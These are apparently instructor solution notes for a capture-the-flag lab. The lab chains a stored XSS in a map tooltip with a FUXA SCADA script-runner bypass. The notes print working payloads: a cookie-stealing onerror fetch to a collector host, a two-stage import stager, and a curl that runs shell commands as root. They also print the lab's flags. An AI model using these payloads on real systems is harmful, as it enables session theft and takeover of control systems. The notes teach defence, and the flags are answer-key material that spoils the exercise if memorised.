# Stage 1 — solution and teaching notes

**Instructor material. Do not hand out.**

## TL;DR

Stored XSS in `@siemens/maps-ng` 49.16.0 map tooltip → payload runs in the
supervisor's session when the admin bot hovers the marker → session cookie is not
`HttpOnly`, so it can be stolen and replayed against `/api/admin/overview`.

```
Site name:  Notfall-Trafostation <img src=x onerror="fetch('http://collector:8080/?c='+encodeURIComponent(document.cookie))">
```

Run `./exploit.py` for the full chain.

## 1 · Recon

The **About** page (`/about`) lists every open-source package the portal ships,
with version and license, and `GET /api/config` states the same versions:

```json
{ "elementVersion": "49.16.0", "mapsVersion": "49.16.0", "maxLabelLength": -1 }
```

`@siemens/maps-ng` has a `49.16.1` released immediately after `49.16.0`.
Diffing the two npm tarballs shows exactly one behavioural change, in
`SiMapTooltipComponent`:

```diff
-    getLabelSnippet(label) {
-        ...
-        return `<div>${label}</div>`;
-    }
-    setContent(tooltip) {
-        this.content().nativeElement.innerHTML = tooltip;
-    }
+    getLabelText(label) {
+        ...
+        return label;
+    }
```

and in the template:

```diff
-  <div #content></div>
+  @for (label of tooltipLabels(); track $index) {
+    <div>{{ label }}</div>
+  }
```

Reproduce in class with:

```bash
npm pack @siemens/maps-ng@49.16.0 && npm pack @siemens/maps-ng@49.16.1
diff -u maps-ng-49.16.0/fesm2022/siemens-maps-ng.mjs \
        maps-ng-49.16.1/fesm2022/siemens-maps-ng.mjs
```

## 2 · Reaching the sink

`SiMapComponent.showTooltipContent()`:

```js
this.tooltip().setTooltip(feature.getProperties().name);
```

So the **site name** is the injection point, and it is rendered only when:

- the map has `displayTooltipOnHover` enabled (the portal does), and
- a pointer actually moves over the marker.

Students can verify on their own site detail page — hover the marker and the
tooltip renders live HTML. `<b>test</b>` showing up bold is the proof.

Two constraints worth drawing out in the debrief:

- `element.innerHTML = ...` parses the markup but **does not execute `<script>`**.
  The payload must use an event handler, and `<img src=x onerror=...>` is the one
  that works here. Worth demonstrating: `<svg onload=...>` is a reflex answer for
  many students, and it **does not fire** when the markup arrives via `innerHTML`
  — the tooltip shows `<svg onload="...">` sitting inert in the DOM. Good moment
  to talk about why gadget choice depends on the insertion method.
- `maxLabelLength` defaults to **50** in the library and truncates longer labels
  mid-tag. The portal sets `-1`; set `MAX_LABEL_LENGTH=50` in `.env` for the hard
  variant (see below).

## 3 · Hard variant (`MAX_LABEL_LENGTH=50`)

The label is cut at 50 characters, so the injected name must be self-contained
within that budget. A single-stage cookie exfil does not fit:

```
<img src=x onerror=fetch('//collector:8080/?'+document.cookie)>   63 chars
```

Two stages do. The collector serves whatever is POSTed to `/s` with a JavaScript
MIME type, and it also answers to the short network alias `c`:

```bash
curl -X POST --data-binary \
  "fetch('http://c:8080/?c='+encodeURIComponent(document.cookie));" \
  http://localhost:8200/s
```

```
<img src=x onerror=import('//c:8080/s')>                          40 chars
```

Verified working. This variant teaches payload-budget thinking and the
stager/stage-2 split without needing any extra infrastructure.

## 4 · Exfiltration

`POST /api/admin/login` sets the session cookie with `httpOnly: false`:

```js
res.cookie(SESSION_COOKIE, token, { httpOnly: false, sameSite: 'lax', path: '/' });
```

so `document.cookie` is readable from the payload. The bot's browser resolves
`collector` on the lab network:

```html
<img src=x onerror="fetch('http://collector:8080/?c='+encodeURIComponent(document.cookie))">
```

## 5 · Replay

```bash
curl -s -H "Cookie: gridops_session=<stolen>" http://localhost:8100/api/admin/overview
```

```json
{
  "supervisor": "ot.supervisor",
  "emergencyOverrideKey": "HSLU{...}",
  "maintenanceConsole": { "enabled": false, "...": "..." }
}
```

Or paste the cookie into the browser's devtools and open `/admin`.

## Debrief points

**Why the library was wrong.** The tooltip needed to render *text*. Building an
HTML string and assigning `innerHTML` turns every data field into markup. The fix
costs nothing: let the framework interpolate. Angular escapes
`{{ }}` by default — the bug only existed because the component stepped around
Angular to touch the DOM directly.

**Why the app was also wrong.** Even with the vulnerable library, this chain needs
three more mistakes:

1. The session cookie was readable from JavaScript (`HttpOnly` missing).
2. No CSP — `default-src 'self'` would have blocked the fetch to `collector:8080`,
   and `script-src` without `'unsafe-inline'` would have blocked the handler.
3. Unvalidated, unsanitised free text from an anonymous user was rendered in a
   privileged user's session.

Defence in depth: fixing any one of these breaks the chain.

**OT relevance.** This is the classic IT→OT pivot shape. The map is a monitoring
convenience, but the account that looks at it holds operational authority. Ask
students what the equivalent is in their own environment: an HMI, an asset
inventory, an alarm list — anything where field-supplied strings are rendered to a
privileged operator.

## Stage 2 — FUXA control system (CVE-2026-43947)

The stolen supervisor session reveals a restricted asset, the **Central Control
System**, and its console address (`http://localhost:8300`). It is a FUXA 1.3.0
SCADA/HMI, fronted by `scada-gate`: the console answers `401` unless the request
carries the `gridops_session` supervisor cookie, so every request below must
replay the stolen session (`-H "Cookie: gridops_session=<token>"` / `--cookie`).
FUXA itself is not published on a host port. Its HMI uses the stock default
login `admin` / `123456`, but the RCE needs no FUXA login.

### Recon

```
GET http://localhost:8300/api/project       # through the gate, with the stolen cookie
```

Returns the whole project, including the server-side scripts. The lab's seeded
project has two, e.g. `s_gridops_telemetry` / `RefreshDispatchTelemetry`, neither
with a `permission` field.

### The bug

`POST /api/runscript` (server/api/scripts/index.js):

```js
} else if (!runtime.scriptsMgr.isAuthorised(req.body.params.script, permission)) {
    res.status(400).json({ error: "unauthorized_error" });
} else {
    runtime.scriptsMgr.runScript(req.body.params.script, ...)
}
```

`isAuthorised()` looks up the **stored** script by `id` and checks its
`permission`; with no `permission`, `(!st.permission || ...)` is true for
everyone. `runScript()` then sees `script.test === true` and calls
`runTestScript()`, which compiles and runs the **`code` from the request body**,
not the stored script. Authorisation is checked on one script, code runs from
another. Guest JWT is issued automatically when no token is sent, so this is
unauthenticated.

### Exploit

```bash
SESSION=<cookie stolen in stage 1>
# Heredoc keeps the body literal, so the inner quotes need no escaping.
curl -s http://localhost:8300/api/runscript \
  -H "Cookie: gridops_session=$SESSION" \
  -H 'content-type: application/json' --data @- <<'JSON'
{"params":{"script":{"id":"s_gridops_telemetry","name":"poc","test":true,
"parameters":[],"code":"return require('child_process').execSync('cat /opt/gridops/emergency-dispatch-key.txt').toString();"}}}
JSON
```

→ runs as **root** and returns the file holding **flag 2**:

```
HSLU{s2_fux4_run5cr1pt_t35t_m0d3_1s_n0t_4n_4uth_ch3ck}
```

`/opt/gridops/field-devices.conf` on the same host holds field-device
credentials — a realistic post-exploitation reward. Run the whole chain with
`solution/exploit_stage2.py`.

### Why the app was also wrong

- The console was reachable from the operations tier with no segmentation beyond
  the gate; a stolen monitoring credential was enough to cross into the control
  network. (The lab enforces the gate so the stage dependency is real; a flat
  network would have let anyone reach FUXA directly.)
- `GET /api/project` disclosed the script inventory with no FUXA auth — it handed
  the attacker the id and name the bypass needs.
- Secure mode was enabled but the seeded scripts had no `permission`, so the
  guard was a no-op. Explicit per-script permissions would have stopped a guest.
- The control system was reachable from the operator network with no network
  segmentation between the monitoring portal and the control plane.

Fix: upgrade to FUXA 1.3.1, set script permissions, and segment the control
network from the business/monitoring tier.

### Debrief — the full IT→OT pivot

Stage 1 is an XSS that steals a *monitoring* credential. Stage 2 turns that
monitoring access into *control-plane* code execution, as root, on a SCADA host —
the shape of a real ICS incident: a web-facing convenience leads, step by step,
to the process network.

## Health check

```bash
cd solution && ./exploit.py
```

Expected: the stage 1 flag within ~15 seconds, plus the control-system address.
If the collector stays empty, check `docker compose logs bot` — the bot logs
every review it opens.

```bash
cd solution && ./exploit_stage2.py
```

Expected: `uid=0(root)` and the stage 2 flag.
